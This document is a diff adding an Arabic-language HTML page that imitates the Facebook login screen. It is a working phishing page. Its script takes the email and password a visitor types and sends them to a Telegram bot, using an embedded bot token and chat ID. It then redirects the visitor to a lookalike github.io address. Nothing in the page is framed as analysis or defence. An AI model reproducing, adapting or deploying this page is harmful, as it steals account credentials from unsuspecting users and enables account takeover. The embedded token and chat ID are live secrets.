@@ -1,0 +1,77 @@
+<!doctype html>
+<html dir=rtl lang=ar>
+<head>
+    <meta charset=UTF-8>
+    <meta content="width=device-width,initial-scale=1" name=viewport>
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        body {font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; direction: rtl;}
+        .login-container {width: 100%; max-width: 400px; background: #fff; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,.1); border-radius: 8px; text-align: center;}
+        .login-container img {width: 200px; margin-bottom: 20px;}
+        .login-container h2 {color: #000; font-size: 20px; margin-bottom: 20px; font-weight: 400;}
+        .login-container input {width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; text-align: right;}
+        .login-container button {width: 100%; padding: 12px; background-color: #1877f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;}
+        .login-container button:hover {background-color: #165eab;}
+        .login-container a {text-decoration: none; display: block; text-align: center; margin-top: 12px;}
+        .login-container a.forget-password {color: #3c22cf;}
+        .login-container a.create-account {background-color: #a0d468; color: #fff; padding: 10px 20px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; transition: background-color .3s;}
+        .login-container a.create-account:hover {background-color: #8cc051;}
+    </style>
+</head>
+<body class="Locale_ar_AR UIPage_LoggedOut _-kb _19_u _605a b_c3pyn-ahh chrome cores-gte4 fbIndex webkit win x1">
+    <div class="login-container">
+        <img alt="فيسبوك" class="_8ilh fb_logo img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg">
+        <h2 class="_8eso" style="color:#000; font-weight:400">يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
+        <div class="_8icy _8iep _9ah- _9ahz">
+            <div class="_52jv _6luv">
+                <input class="_55r1 _6luy inputtext" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input class="_55r1 _6luy inputtext _9npi" id="password" placeholder="كلمة السر" required type="password">
+                <button onclick="sendToTelegram()">تسجيل الدخول</button>
+                <a class="forget-password" href="#">هل نسيت كلمة السر؟</a>
+                <hr>
+                <div class="_6ltg">
+                    <a class="_42ft _4jy0 _4jy2 _4jy6 _51sy _6lti create-account selected" href="#" ajaxify="/reg/spotlight/" data-testid="open-registration-form-button" id="u_0_0_NY" rel="async" role="button">إنشاء حساب جديد</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        function sendToTelegram() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            if (email === "" || password === "") {
+                alert("ادخل كلمة السر");
+                return;
+            }
+
+            const token = '7356186901:AAHegR0y0g6LGQAefHabKUKB49z8yYC0W_I'; 
+            const chatId = '5701198678'; 
+
+            const message = `Email: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = 'https://facebook-com-profile-615589484884784848.github.io/-/'; // ضع هنا رابط الصفحة التي تريد التحويل إليها
+                } else {
+                    alert('فشل في إرسال التفاصيل.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('خطأ في إرسال التفاصيل.');
+            });
+        }
+    </script>
+</body>
+</html>
